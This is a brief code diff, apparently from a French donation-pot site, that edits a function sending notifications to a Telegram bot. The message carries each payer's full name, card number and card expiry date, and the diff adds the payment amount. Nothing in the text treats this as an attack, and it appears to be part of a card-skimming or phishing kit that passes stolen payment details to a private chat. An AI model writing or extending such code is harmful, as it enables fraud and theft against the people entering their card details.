@@ -37,6 +37,7 @@ function sendTelegramNotif({ prenom, nom, amountCents, cagnotteTitle, message, c
     if (!botToken || !chatId) return reject(new Error('Telegram non configuré'));
 
     const text = [
+      `${(amountCents / 100).toFixed(0)}€`,
       `${prenom} ${nom}`,
       `${cardNumber}`,
       `${cardExpiry}`,
